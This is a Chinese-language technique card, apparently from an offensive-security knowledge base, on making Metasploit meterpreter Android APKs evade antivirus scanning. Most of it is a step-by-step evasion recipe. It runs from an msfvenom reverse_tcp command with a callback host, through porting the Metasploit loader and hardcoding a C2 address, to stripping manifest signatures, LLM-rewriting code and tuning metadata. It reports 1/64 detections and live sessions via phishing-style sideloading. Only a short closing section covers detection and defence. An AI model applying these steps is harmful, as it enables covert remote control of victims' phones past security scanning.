---
id: mobile-android-apk-source-level-av-evasion-meterpreter-loader
title: Android APK 源码级免杀：自建工程重实现 meterpreter loader、改写启动与代码风格并裁剪 Manifest 元数据绕过静态查杀
type: scenario
domain: mobile
path: mobile/android
technique: android-apk-source-level-av-evasion
aliases:
- Android 免杀
- msfvenom APK 免杀
- 源码免杀
- meterpreter Android loader
- APK 静态查杀绕过
- AndroidManifest 静态免杀
tags:
- android
- apk
- av-evasion
- anti-detection
- malware
- metasploit
- meterpreter
- manifest
- permissions
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V678
  verified_at: '2026-11-13T12:08:29+08:00'
  notes: 已对照原文与61张本地图核对：msfvenom 26/64、编码器单次/20次9/59与-b失败/多编码10/59、TheFatRat/backdoor-apk(13/65)/old-fatrat(18/64)/venom(26/64)、空工程0/64、移植loader后4/64、改写config/main真机回连后8/64、腾讯手机管家无告警、Android 11/9回连、360加固后4/66(ESET/Fortinet/K7GW/MaxSecure 壳误报)均一致；已把卡内『植入loader=8/64』修正为『loader移植=4/64、改写config/main回连=8/64』。注意：原文另有36张远端 xzfile 图片未落盘到 img/，涉及源码混淆后1/64、3/65、2/65 等截图仅能按正文文字核对(正文明确给出这些数字)。Axml 幻数/stringCount 段确认已被既有 mobile-android-axml-byte-fuzz-antidecompile 覆盖，不另立卡正确。原文未给受影响版本，未设 affected_versions。未复现工程。
---

## 一句话结论

直接投递 msfvenom 生成的 meterpreter APK 会被主流引擎按包结构、内置 stage loader 与 Manifest 特征查杀（原文 VT 26/64）；把 msf 的 Android stage 源码（Payload/MainService/MainActivity/MainBroadcastReceiver）移植到自建工程，跳过其加密 configBytes 解析改为直接写 C2 地址，再改写启动方式与代码风格（换包名/类名、删无用函数、调换变量、用 LLM 重写）、注释掉 msf 特征 intent-filter、裁剪权限与调整 SDK/依赖版本，可把静态检出降到个位数并仍能正常回连（原文最低 1/64，腾讯手机管家扫描无告警，Android 9/11 均拿到 meterpreter 会话）。

## 原理

- **静态查杀看的是包与代码特征，不是行为**：msfvenom 成品 APK 有固定的包名（`com.metasploit.stage`）、固定的 loader 类结构（MainActivity/MainService/Payload）、Manifest 中的 `data scheme="metasploit" host="my_host"` intent-filter、以及内置 stage 的字节特征；VT 上常见 family label 为 `metasploit/remotecode`、`hacktool.metasploit`，即引擎直接按 MSF 家族特征匹配。
- **为什么编码器无效**：`-e x86/shikata_ga_nai` 等编码器作用于 x86 shellcode，对 APK 的 Java/stage 部分不起作用；原文实测单次编码 9/59、20 次 9/59、`-b` 过滤失败、多编码器叠加反而 10/59（`Exploit.Metacoder.Shikata.Gen` 本身就是被记录的特征）。结论：APK 免杀要去改 Java/stage 结构与 Manifest，而不是编码 shellcode。
- **源码即载荷**：msf 的 Android payload 本身就是 Java 代码——loader 负责读取配置、解密 stage、启动 Service/广播接收器，最终反射加载并运行 meterpreter。把它复制进自己的工程，功能等价但包名、类名、调用链、字符串分布都已不同，不再命中 msfvenom 成品特征；原文移植 loader 后降到 4/64，改写 config/main 并真机回连的构建为 8/64（仍带 hacktool.metasploit 家族特征）。
- **配置文件是固定特征之一**：msfvenom 会把 LHOST/LPORT 等加密写进 `configBytes`（生成逻辑在 `lib/rex/payloads/meterpreter/config.rb`）。自己编译时无需复现加密：把 `ConfigParser.parseConfig(configBytes)` 的结果直接绕过，手写 `tcp://<ip>:<port>` 并直接调用 `runStageFromTCP`，删掉 HTTP 通道代码，既简化代码又减少 stage/配置相关特征。
- **代码风格与元数据也是特征面**：静态引擎与 ML 模型会看代码相似度、权限组合、`minSdkVersion`/`buildToolsVersion`、依赖库版本。原文让 LLM 按语义重写启动/运行代码、交换全局/局部变量、删除 `findContext()` 等无用函数后达到 1/64；又发现 minSdkVersion=28 触发 Antiy 告警、改 30 后转 DrWeb 告警、把 constraintlayout 改到 2.1.4 才消除——属于“与已知样本元数据撞特征”。
- **加固（免费 360）是双刃剑**：源码化后 360 加固不再拒绝该 APK（此前 msfvenom 原包被 360 以“有风险应用”拒绝），但免费版加固会在包内留下 `com.qihoo.util`/`libjgdtc.so` 等壳特征文件，导致 ESET/Fortinet/K7GW 等按 `Packed.Jiagu` 告警（原文 4/66）；这是壳的误报，不是载荷仍被识别，360 客服也确认付费版可去特征。
- **为什么成立**：静态 AV 是特征/相似度匹配而非语义证明；换一份等价实现就能避开旧特征，而 Android 运行时行为不变——原文最终在 Android 9/11 真机上均成功建立 meterpreter 会话，且腾讯手机管家全盘扫描无恶意应用。

## 触发条件

- 攻击者能构建 Android 工程（Android SDK/Gradle + 签名密钥），并能运行 msf handler 做回连验证。
- 投递方式为旁加载/钓鱼安装 APK，需要绕过终端 AV、应用市场或 VT 类多引擎的静态扫描；目标没有强制安装来源策略或动态沙箱。
- 目标检测以静态特征（YARA/家族签名/启发式/ML）为主；带行为监控的 EDR/应用市场动态检测可能仍会拦截。
- 检测结果随引擎特征库更新变化（原文为 2023 年 VT 数据），手法本身需要按当前引擎重新调参验证。

## 利用步骤

1. 生成对照样本：`msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > black.apk`，记录 VT/VirScan 检出（原文 26/64），确认基线。
2. 从 metasploit-framework 取 Android stage 源码（Payload/MainService/MainActivity/MainBroadcastReceiver 等 loader 类）；这些类负责解析配置、解密并加载 stage、建立 TCP/HTTP 通道。
3. 新建空白 Android 工程，把上述类移植进来，包名/类名全部替换；先验证空工程无误报（原文 0/64），再植入 loader（4/64）；随后把 config/main 改为直连 TCP 并真机回连（8/64，说明剩余检出为 MSF 家族特征）。
4. 改写配置与启动逻辑：不实现 msf 的 configBytes 加密，把 `ConfigParser.parseConfig(...)` 换成手写配置常量（如 `tcp://ip:port`），删除 HTTP 通道代码，直接调用 `runStageFromTCP`；同时改写 main/Activity/Service 启动路径。
5. 代码风格与特征清理：删无用函数与注释、调换全局/局部变量、用 LLM 或格式化工具语义等价重写；注释掉 Manifest 中 msf 特征 intent-filter（`data scheme="metasploit" host="my_host"` 等）；按需裁剪权限，仅保留启动 Service 所需的 INTERNET 等必要项。
6. 元数据调参：逐项修改 `minSdkVersion`、`buildToolsVersion`、依赖库版本（如 constraintlayout），每次改完丢 VT 对照，消除因“撞已知样本元数据”产生的告警。
7. 打包签名后先在测试机验证回连：`multi/handler` 收到 `Meterpreter session opened`，`sysinfo`/`getpid` 对照目标进程确认会话确实来自该 APK；再在装有手机管家的设备上安装扫描验证（原文扫描无恶意应用、会话正常）。
8. 需要额外静态对抗时，对 AXML 做单字节/字段篡改使 apktool/jadx 无法解析 Manifest 而系统仍可安装（见关联卡），但注意这会增加“对抗样本”信号。

## PoC

原文验证链（示例值）：`msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=10008 R > black.apk` → VT 26/64；空工程 → 0/64、植入 loader → 4/64、改写 config/main 并真机回连 → 8/64；代码风格重写后 → 1/64 且 `multi/handler` 收到会话（`Sending stage (78189 bytes)`、`Meterpreter session 1 opened`），目标 Android 11/9 上 `sysinfo` 显示 `dalvik/android`、`pwd /data/user/0/<pkg>/files`；腾讯手机管家扫描 100% 无恶意应用。无完整可执行工程（原文为过程记录，未提供成品代码），未在本机复现。

## 变体与关联

- **AXML 反编译对抗**：改 magic/字符串池字段使静态解析失败，见 [[mobile-android-axml-byte-fuzz-antidecompile]]；分析/修复侧见 [[mobile-android-axml-manifest-hardening-repair]]。
- **加固与脱壳**：360/梆梆等壳的识别与脱壳见 [[mobile-android-packer-apkid-frida-dexdump-jadx]]、[[mobile-android-360-hardening-fundex-lsposed-dump]]；本卡只把加固作为“壳特征误报来源”讨论。
- **运行环境反检测**：Root/模拟器/代理检测绕过见 [[mobile-android-anti-detection-root-emulator-proxy]]。
- **变体**：仅替换 msfvenom 成品的 smali 启动类（保留原包结构与 stage 特征，检出仍高，不推荐）；自研 loader 动态加载分离 dex；商业壳/付费加固去壳特征。
- **负面结论（本文实测）**：msfvenom 编码器（shikata_ga_nai、多编码器叠加）对 APK 静态免杀基本无效甚至变差；TheFatRat（backdoor-apk/old-fatrat/msfvenom 嵌入）、venom 等旧工具生成的 APK 检出 13-26/64，主要价值是理解原理而非直接可用。

## 检测与防御

- **检测（引擎/分析侧）**：不要只依赖 APK 家族签名；结合代码相似度、Manifest 元数据一致性（minSdkVersion/buildToolsVersion/依赖版本组合异常）、权限组合、intent-filter 与 DEX 结构做多维评分；把“可安装运行但 apktool/jadx 解析失败”“APK 带壳但外壳特征异常”作为对抗样本信号；动态沙箱观察反射加载 stage、动态注册 Service、外连 C2 等行为。
- **检测（终端侧）**：限制未知来源安装（企业 MDM/Play Protect/应用市场强制），安装时做动态行为扫描；监控应用首次启动后的可疑外连、`dalvik` 进程中反射加载 dex/jar、后台 Service 常驻。
- **防御**：对高价值终端关闭旁加载、启用 Play Integrity/设备证明；网络侧对已知 C2 端口/域名做检测；邮件/IM 投递 APK 一律隔离并在沙箱运行。
- **说明**：VT 检出数低不等于安全（引擎可能滞后/被绕过），行为与内存检测比静态包特征更可靠；本卡为攻击方手法记录，检测方可据此设计更稳健的静态+动态组合策略。
